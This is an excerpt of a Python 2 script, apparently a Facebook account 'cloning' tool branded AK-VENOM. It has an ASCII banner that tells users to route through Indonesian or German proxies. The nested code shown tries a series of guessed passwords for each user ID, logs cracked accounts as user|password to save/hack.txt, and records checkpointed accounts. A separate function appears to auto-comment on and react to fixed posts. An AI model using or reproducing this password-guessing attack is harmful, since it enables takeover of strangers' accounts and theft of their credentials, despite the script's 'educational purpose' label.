...
                                  💕
\x1b[1;94m──────────────────────────────────────────────────────
\x1b[1;91m➣  Just speard Love 😌 don't hate anyone
\x1b[1;92m➣  Life is the art of drawing without an eraser.
\x1b[1;93m➣   AUTHOR : Kabir Arya
\x1b[1;94m➣     FROM : Saitan Nagar, Andheri gali k pass😅
\x1b[1;95m➣ WHATSAPP : Wo toh apna personal hai
\x1b[1;96m➣ FACEBOOK : https://facebook.con/AKV3N0M
\x1b[1;97m➣  WARNING : ONLY EDUCATIONAL PURPOSE 
\x1b[1;91m➣  WARNING : DON'T COPY MY SCRIPT
\x1b[1;92m➣    NOTE. : IF YOU GET TO FACE PROBLEM IN CLONING TIME
\x1b[1;93m➣    NOTE  : USE PROXY OF INDONESIA /Germany FOR CLONING  
\x1b[1;94m──────────────────────────────────────────────────────""" 
...
def bot_komen():
    ...
    una = '100041129048948'
    kom = 'Ak.Venon\xf0\x9f\x98\x98'
    kom = 'Ak.Venom\xf0\x9f\x98\x8e'
    reac = 'LOVE'
    post = '481555709892060'
    post2 = '481559296558368'
    kom2 = 'Ak.Venom\xf0\x9f\x98\x98\xe2\x98\xa0\xef\xb8\x8f'
    kom = 'Ak.Venom\xf0\x9f\x98\x98\xf0\x9f\x98\x98'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[AK-VENOM] ' + user + ' |\x1b[0m ' + p1
                cek = open('save/hack.txt', 'a')
                cek.write(user + '|' + p1 + '\n')
                cek.close()
                oks.append(user + p1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[CP] ' + user + ' |\x1b[0m ' + p1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;;92m[AK-VENOM] ' + user + ' |\x1b[0m ' + p2
                    cek = open('save/hack.txt', 'a')
                    cek.write(user + '|' + p2 + '\n')
                    cek.close()
                    oks.append(user + p2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;;93m [Roy-CP] ' + user + ' |\x1b[0m ' + p2
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;93m [CP] ' + user + ' |\x1b[0m ' + p3
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[AK-VENOM] ' + user + ' |\x1b[0m ' + p4
                            cek = open('save/hack.txt', 'a')
                            cek.write(user + '|' + p4 + '\n')
                            cek.close()
                            oks.append(user + p4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;93m[CP] ' + user + ' |\x1b[0m ' + p4
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[AK-VENOM] ' + user + ' |\x1b[0m ' + p5
                                cek = open('save/hack.txt', 'a')
                                cek.write(user + '|' + p5 + '\n')
                                cek.close()
                                oks.append(user + p5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;93m [CP] ' + user + ' |\x1b[0m ' + p5
                                ...
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[AK-VENOM] ' + user + ' |\x1b[0m ' + p6
                                    cek = open('save/hack.txt', 'a')
                                    cek.write(user + '|' + p6 + '\n')
                                    cek.close()
                                    oks.append(user + p5)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;;93m [CP] ' + user + ' |\x1b[0m ' + p6
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[AK-VENOM] ' + user + ' |\x1b[0m ' + p7
                                        cek = open('save/hack.txt', 'a')
                                        cek.write(user + '|' + p7 + '\n')
                                        cek.close()
                                        oks.append(user + p7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;93m[CP] ' + user + ' |\x1b[0m ' + p7
                                        cekpoint.append(user + p6)
        except:
            pass
